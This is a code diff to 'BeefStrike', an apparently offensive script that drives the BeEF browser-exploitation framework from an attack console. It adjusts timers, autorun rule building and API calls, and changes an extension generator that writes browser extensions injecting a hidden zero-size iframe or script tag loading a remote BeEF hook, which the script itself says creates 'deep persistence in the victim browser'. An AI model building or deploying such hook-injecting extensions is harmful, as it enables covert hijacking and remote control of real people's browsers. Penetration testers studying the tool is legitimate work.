@@ -94,6 +94,7 @@ menubar(" BeEF ", "beefstrike", 2);
 
 # menu - access all of beefstrike features
 popup beefstrike {
+	local('$file2host $webrtc %h %h2 @peers $ippeers $link $link00 $link01 $from $to $fromto $link02 $link03 $link04 $user $urlconnect $filterpath $srvhost $portmonitor $tagtoreplace $sslstriport $pass $mount $mountedfile $file2copy $file2hosturipath $eth0 $filtercontent $handlefilter $reportfile $reporttitle $author $logo $iploc $maptype $mapfile $req ') ;
 	menu "Start" {
 		menu "Control BeEF service" {
 			item "BeEF PATH" {
@@ -250,7 +251,7 @@ popup beefstrike {
 				}
 			item "ARE-Builder" {
 				local('$rules');
-				$rules = open_table_tab("Rule Builder", "", @("id", "Rule_name", "Rule_author", "Rule_browser", "Rule_browser_vers", "Rule_os", "Rule_os_vers", "exec_order", "exec_delay", "chain_mode"), @(), @("Create ARE-Rule", "-Refresh-", "Build", "Publish"), "", 1);
+				$rules = open_table_tab("Rule Builder", "", @("id", "Rule_name", "Rule_author", "Rule_browser", "Rule_browser_vers", "Rule_os", "Rule_os_vers", "exec_order", "exec_delay", "chain_mode"), @(), @("Create ARE-Rule", "-Refresh-", "Build", "Publish", "Commands list"), "", 1);
 				refresh_rules($rules);
 				}
 			}
@@ -357,7 +358,7 @@ popup beefstrike {
 				show_message("To generate browsers Extensions, you need to use Kango Framework. \nDownload it from: http://kangoextensions.com/kango/kango-framework-latest.zip");
 				$kango_path = prompt_text("Absolute Path to kango.py:","/root/kango-framework-latest/kango.py");
 				}
-			item "Beef-Injector" {
+			item "Beef-Implant" {
 				generate_beefcli_plug() ;
 				}
 			item "Beef-Controler" {
@@ -526,22 +527,22 @@ popup geo_hook {
 }
 on host_add {}
 # The heart beat of BeefStrike, specify the frequency of each update : zombi online and offline list, zombi importation
-on heartbeat_5s {
+on heartbeat_7s {
 	zombiupdate();
 	}
 
 #check api key availability
-on heartbeat_60s {
+on heartbeat_77s {
 	if ($key eq "00000000000000000000000" ){ append($console, "\c4[!]No Key available");}
 	if ($key eq "" ){ append($console, "\c4[!]No Key available");}
 	if ($key eq " " ){ append($console, "\c4[!]No Key available");}
 	}
 #update logs
-on heartbeat_15s {
+on heartbeat_60s {
 	logupdate();
 	}
 # free memory	
-on heartbeat_600s {
+on heartbeat_300s {
 	[System gc] ;
 	}
 	
@@ -1109,7 +1110,7 @@ on tab_table_click {
 	}
 	if ($3 eq "Commands list") {
 		local('$commandtab');
-		$commandtab = open_table_tab("Commands", "", @("id","name","category"), @(), @("Fill it", "See autorun list"), "cmde_hook", 1);
+		$commandtab = open_table_tab("Commands", "", @("id","name","category","description"), @(), @("Fill it", "See autorun list"), "cmde_hook", 1);
 		fill_cmde_tab($commandtab);
 	}
 	if ($3 eq "-Refresh-") {
@@ -2337,6 +2338,7 @@ sub import_profil_conf {
 	}
 # #: Check the browser type and version using another web service.
 sub radar {
+	local('$link $request');
 	$link = "http://www.useragentstring.com/?uas=" . $1 . "&getJSON=agent_name";
 	$request = "curl "  . $link . " > ua.txt";
 	cmd($console , "$request");
@@ -2385,15 +2387,16 @@ sub ddosing {
 	}
 # generate Extension for beef injection.
 sub generate_beefcli_plug {
+	local('$name_project_folder $js_to_injected $content_js $homepage_url $plug_creator $plug_name $extension_info_json');
 	show_message("This process will help you to quickly generate \"BeEF Injector\" Extensions for the most populars browsers. \nBy using these Extensions, you will setup a deep persistence in the victim browser. \nSo Please DON'T FORGET TO CLEAN your victim browser after your pentest ... \nMy code doesn't care about it :-(. . \n----------------------------\nTry to make no mistake during the generation process!!! Otherwise your Extension will not be generated");
 	$name_project_folder = prompt_text("Name the project folder :","Beef_Injector");
 	cmd_async("mkdir " . $plug_project . "/" . $name_project_folder . ""); 
 	cmd($console , "xterm -e 'python ". $kango_path . " create " . $plug_project . "/" . $name_project_folder . "'"); 
 	sleep(500); show_message("Name your project in the output terminal before clicking OK and continue");
-	#$js_to_injected = prompt_text("Code to inject(<SCRIPT>,<IFRAME>,...). Add : \\ , before every: \"  for string validity.", "<iframe src=" . $beefdemo . " width=0 height=0 style=\\\"visibility: hidden\\\" scrolling=no frameborder=0 seamless=seamless></iframe>");
-	$js_to_injected = prompt_text("Code to inject(<SCRIPT>,<IFRAME>,...). Add : \\ , before every: \"  for string validity.", "<script language=javascript type=text/javascript>var script = document.createElement('script'); script.setAttribute(\\\"src\\\", \\\"". $beefhook . "\\\"); (document.body || document.head || document.documentElement).appendChild(script); </script>");
-	#$content_js = "document.body.innerHTML = document.body.innerHTML + \"" . $js_to_injected . "\"";
-	$content_js = $js_to_injected ;
+	$js_to_injected = prompt_text("Code to inject(<SCRIPT>,<IFRAME>,...). Add : \\ , before every: \"  for string validity.", "<iframe src=" . $beefdemo . " width=0 height=0 style=\\\"visibility: hidden\\\" scrolling=no frameborder=0 seamless=seamless></iframe>");
+	#$js_to_injected = prompt_text("Code to inject(<SCRIPT>,<IFRAME>,...). Add : \\ , before every: \"  for string validity.", "<script language=javascript type=text/javascript>var script = document.createElement('script'); script.setAttribute(\\\"src\\\", \\\"". $beefhook . "\\\"); (document.body || document.head || document.documentElement).appendChild(script); </script>");
+	$content_js = "document.body.innerHTML = document.body.innerHTML + \"" . $js_to_injected . "\"";
+	#$content_js = $js_to_injected ;
 	$plug_description = prompt_text("Description of your Extension", "BeEF hook injector. You better change this description " );
 	$homepage_url = prompt_text("Extension Home Page:","http://beefproject.com/" );
 	$plug_creator = prompt_text("Extension Author:", "@thebenygreen");
@@ -2414,6 +2417,7 @@ sub generate_beefcli_plug {
 	}
 # generate Extension for beef control.
 sub generate_beefsrv_plug {
+	local('$name_project_folder $main_js $plug_iframe_of_popup $plug_description $main_js $homepage_url $plug_creator $plug_name $extension_info_json');
 	show_message("This process will help you to quickly generate \"BeEF Injector\" Extensions for the most populars browsers. \nBy using these Extensions, you will setup a deep persistence in the victim browser. \nSo Please DON'T FORGET TO CLEAN your victim browser after your pentest ... \nMy code doesn't care about it :-(. . \n----------------------------\nTry to make no mistake during the generation process!!! Otherwise your Extensions will not be generated");
 	$name_project_folder = prompt_text("Name the project folder :","beefsrvplug");
 	cmd_async("mkdir " . $plug_project . "/" . $name_project_folder . ""); 
@@ -2440,6 +2444,7 @@ sub generate_beefsrv_plug {
 ########################## ARE-Workshop ###############################################
 # this method build a rules based on the specified profile and related commands
 sub rules_builder {
+	local('$texttosave $addtext $Code $Condition $name $Param $plug_creator $plug_name $extension_info_json');
 	$texttosave = "{" ;
 	$Rule_name = @rule_build[$1]["Rule_name"];
 	$Rule_author = @rule_build[$1]["Rule_author"];
@@ -2450,15 +2455,16 @@ sub rules_builder {
 	$exec_order  = @rule_build[$1]["exec_order"];
 	$exec_delay = @rule_build[$1]["exec_delay"];
 	$chain_mode = @rule_build[$1]["chain_mode"];
-	$addtext = "\n  \"name\": \"" . $Rule_name . "\", \n \"author\": \"" . $Rule_author . "\",  \"browser\": \"" . $Rule_browser . "\",\n  \"browser_version\": \"" . $Rule_browser_vers . "\",\n  \"os\": \"" . $Rule_os . "\",\n  \"os_version\": \"" . $Rule_os_vers . "\",\n  \"modules\": [\n" ;
+	$addtext = " \\\"name\\\": \\\"" . $Rule_name . "\\\", \\\"author\\\": \\\"" . $Rule_author . "\\\",  \\\"browser\\\": \\\"" . $Rule_browser . "\\\", \\\"browser_version\\\": \\\"" . $Rule_browser_vers . "\\\", \\\"os\\\": \\\"" . $Rule_os . "\\\", \\\"os_version\\\": \\\"" . $Rule_os_vers . "\\\", \\\"modules\\\": [" ;
 	$texttosave = "". $texttosave . "" . $addtext . ""; 
 	for ($i = 0; $i < size(@beef_autorun); $i++ ) {
 		if (@beef_autorun[$i]["category"] eq "" . $Rule_name . "" ) {
-			$name = @beef_autorun[$i]["name"] ;
+			$id = @beef_autorun[$i]["id"] ;
+			$name = @beef_cmde[$i]["name"] ;
 			$Param = @beef_autorun[$i]["Param"] ;
 			$Condition = @beef_autorun[$i]["Condition"] ;
 			$Code = @beef_autorun[$i]["Code"] ;
-			$addtext = "{\"name\":\"". $name ."\",\"Condition\":\"". $Condition ."\",\"Code\":\"". $Code ."\",\"options\":\"". $Param ."\"}";
+			$addtext = "{\\\"name\\\":\\\"". $name ."\\\",\\\"Condition\\\":\\\"". $Condition ."\\\",\\\"Code\\\":\\\"". $Code ."\\\",\\\"options\\\":\\\"". $Param ."\\\"}";
 			$texttosave = "". $texttosave . "" . $addtext . ""; 
 			$j = size(@beef_autorun) - 1 ; 
 			if ($i != $j) { $texttosave = "". $texttosave . "," ; }
@@ -2466,17 +2472,18 @@ sub rules_builder {
 			println($addtext);
 		}	
 	$texttosave = "" . $texttosave . "]," ;
-	$addtext = "\n \"execution_order\": \"" . $exec_order . "\", \n \"execution_delay\": \"" . $exec_delay . "\",  \"chain_mode\": \"" . $chain_mode . "\"}" ;
+	$addtext = "\\\"execution_order\\\": \\\"" . $exec_order . "\\\", \\\"execution_delay\\\": \\\"" . $exec_delay . "\\\",  \\\"chain_mode\\\": \\\"" . $chain_mode . "\\\"}" ;
 	$texttosave = "". $texttosave . "" . $addtext . ""; 
 	println($texttosave);
 	$savefilename  = "" . $Rule_name . ".json" ; # dot json extension is added at the end.
-	cmd($console , "echo '" . $texttosave . "' > " . $bstrk_AREWorkshop . "/" . $savefilename . "");
+	cmd($console , "echo $texttosave > " . $bstrk_AREWorkshop . "/" . $savefilename . "");
 	show_message("Rule is ready. You can modify or publish it now");
 	file_get($endp );
 	append($console , "\n\c9[+] Rule is ready. You can modify or publish it now " );
 	}
 # this method publish a rule provided by the user.
 sub rules_publish {
+	local('$rulejson $are_request');
 	$rulejson = "" . $1 . ".json";
 	cmd($console , "cp " . $bstrk_AREWorkshop . "/$rulejson " . $beefpath "/arerules/enabled");
 	$link = "" . $beefUrl . "/api/autorun/rule/add?token=$key";
@@ -2490,12 +2497,12 @@ sub refresh_enabled {
 	table_set($1, @rule_enabled);
 	}
 sub rules_list {
+	local('$getare $are_request $aresize');
 	if ( $key ne "00000000000000000000000") { 
 		$link = "" . $beefUrl . "/api/autorun/rule/list/all?token=$key";
 		$are_request = "curl "  . $link . "";
 		append($console, "\n\c9[+] list of ARE-rule enabled:");
 		cmd($console , "$are_request");
-	
 		$getare = [BeefRequester BeefGetRequest: "$link"]; sleep(50);
 		$aresize = [AreRulesList AreRules_size: "$getare"]; sleep(50);
 		for ($i = 0; $i < $aresize; $i++){
@@ -2509,6 +2516,7 @@ sub rules_list {
 	}
 # This method delete a published rule provided by the user.
 sub rules_delete {
+	local('$are_request');
 	#$idrule = prompt_text("Rule ID : ","0");
 	$link = "" . $beefUrl . "/api/autorun/rule/delete/" . $idrule . "?token=$key";
 	$are_request = "curl "  . $link . "";
@@ -2551,6 +2559,7 @@ sub edit_rules_param {
 	}	
 # This method trigger a rule selected by the user.
 sub rules_trigger {
+	local('$link $are_request');
 	#$idrule = prompt_text("Rule ID : ", "$1");
 	$link = "" . $beefUrl . "/api/autorun/rule/trigger/" . $1 . "?token=$key";
 	$are_request = "curl " . $link . "";
